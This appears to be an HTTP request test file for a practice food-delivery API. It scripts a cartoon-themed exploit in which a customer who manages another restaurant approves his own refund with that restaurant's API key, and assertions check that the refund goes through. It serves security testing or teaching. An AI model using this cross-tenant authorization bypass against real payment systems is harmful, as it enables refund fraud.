# @import ../common/setup.http
@host = {{base_host}}/v301

# Sandy enrolls more restaurants and now Chum Backet is enrolled in the system.
# Plankton is a manager at Chum Bucket, but he also keeps his old customer
# account to order from Krusty Krab.


### Plankton logs in and orders a Krabby Patty from Krusty Krab
POST /auth/login
Content-Type: application/json

{
    "email": "plankton@chum-bucket.sea",
    "password": "i_love_my_wife"
}

?? status == 200
?? js response.parsedBody.email == plankton@chum-bucket.sea


### Record Plankton's balance
# @name initial_balance
GET /account/credits


###
# @name cart
POST /cart?restaurant_id=1
Authorization: {{plankton_auth}}


###
POST /cart/{{cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "4" }


###
# @name order
POST /cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=1&delivery_address=Chum Bucket


### Krusty Krab processes and delivers the order
PATCH /orders/{{order.order_id}}/status
X-API-Key: {{krabs_api_key}}
Content-Type: application/x-www-form-urlencoded

status=delivered


### Plankton's balance is now lower
# @name balance_after_order
GET /account/credits
Authorization: {{plankton_auth}}

?? js parseFloat(response.parsedBody.balance) < {{parseFloat(initial_balance.balance)}}


### Plankton requests a refund for his order
# @name refund_request
POST /orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=2.50

# --- Exploit: Plankton approves his own refund request in Krusty Krab
# using his Chum Bucket manager API key ---


### Plankton approves the refund using his Chum Bucket manager API key
PATCH /orders/{{order.order_id}}/refund/status
Authorization: {{plankton_auth}}
X-API-Key: {{chum_bucket_api_key}}
Content-Type: application/x-www-form-urlencoded

status=approved

?? status == 200
?? js response.parsedBody.status == approved


### Plankton receives his refund
GET /account/credits
Authorization: {{plankton_auth}}

?? js parseFloat(response.parsedBody.balance) == {{parseFloat(balance_after_order.balance) + parseFloat(refund_request.amount)}}
